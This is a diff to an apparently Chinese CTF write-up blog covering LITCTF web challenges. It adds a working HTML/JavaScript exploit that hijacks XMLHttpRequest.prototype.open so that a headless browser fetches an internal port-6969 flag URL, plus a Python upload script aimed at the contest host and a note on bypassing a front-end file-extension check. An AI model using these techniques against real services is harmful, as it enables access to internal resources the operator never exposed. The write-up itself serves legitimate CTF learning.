@@ -125,7 +125,7 @@ i did a thing
 
 源码很长，是一个 TypeScirpt 的。然后做的事情是用 OCR 扫描图片提取文本，之后有一个 sqlite 的数据库操作。
 
-源码还看不太懂，跟着 gpt 慢慢来。大概看懂了，flag 在数据库的某个表里面，代码有执行一个查询操作，不过是根据车牌号来查的，flag 就是这个车牌的金额。
+~~源码还看不太懂，跟着 gpt 慢慢来。~~大概看懂了，flag 在数据库的某个表里面，代码有执行一个查询操作，不过是根据车牌号来查的，flag 就是这个车牌的金额。
 
 打开题目是让我传一个仅包含文本的车牌图片，然后它会识别车牌，告诉我这个车牌对应的一些信息。糟糕的点是 flag 的车牌号是随机生成的，看上去没办法直接获得 flag。难道说代码的随机数生成是有问题的吗？或许这是一个值得思考的点。
 
@@ -200,6 +200,94 @@ while True:
 fetch me the flag at http://litctf.org:31770/
 
 #### 题目分析
+
+这个题目为什么好眼熟.....
+
+思路也比较简单，根据源码可以知道访问 6969 端口就可以拿到 flag 文件，但是题目正常的业务逻辑仅仅只是访问了 6969 端口而并不会返回响应的 flag 文件：
+
+![image-20230822165657380](../../_static/images/image-20230822165657380.png)
+
+> `newPage + goto 打开我们上传的 html 页面`
+>
+> `evaluate 在打开的页面中执行 js`
+
+面对这种情况，有一个很神奇的做法，就是像 js 原型链污染那样去修改 XMLHTTPRequest 的原型，让其的 open 和 send 能够访问 6969 端口并输出 flag 文件的内容。exp 如下：
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <h1 id="h">test</h1>
+    <script>
+        window.XMLHttpRequest.prototype.open = (...args) => {
+            fetch(args[1])
+                .then((res) => res.text())
+                .then(txt => document.getElementById("h").innerHTML = txt.replace(/(.{10})/g, '$1\n') + "**DONE**")
+
+            //document.getElementById("h").innerHTML = args[1].replace(/(.{10})/g, '$1\n') + "    done";
+        }
+        window.XMLHttpRequest.prototype.send = () => { }
+
+    </script>
+</body>
+
+</html>
+```
+
+以上是核心的 exp，现在编写 python脚本进行全部的处理：
+
+```python
+import requests
+from PIL import Image
+from io import BytesIO
+
+
+def main():
+    url = "http://litctf.org:31770/runHTML"
+    
+    with open("./exp.html","rb") as file:
+        files = {"file" : ("exp.html", file, 'text/html')}
+        r = requests.post(url=url,files=files)
+        ans = r.content
+        image = Image.open(BytesIO(ans))
+        image.save("flag.png")
+        print("check!")
+    
+    
+
+if __name__ == "__main__":
+    main()
+
+```
+
+![image-20230822171346213](../../_static/images/image-20230822171346213.png)
+
+### too much kirby
+
+**题目描述**
+
+literally every single unused web chal jammed into one kirby-sized package (horrible painful amalgamation)
+
+#### 题目分析
+
+**非预期：**
+
+ /challenge5 上传文件就可以拿到 flag，这里需要绕过一下前端的后缀名检测。
+
+![image-20230822233536241](../../_static/images/image-20230822233536241.png)
+
+预期解当然就是绕过前四关然后拿到 flag，这里第三关我暂时没想出来如何绕过。等待wp中....
+
+### Art Contest
+
+[Art Contest | Jro's Blog (junron.dev)](https://blog.junron.dev/writeups/web/art-contest.html)
 
 
 
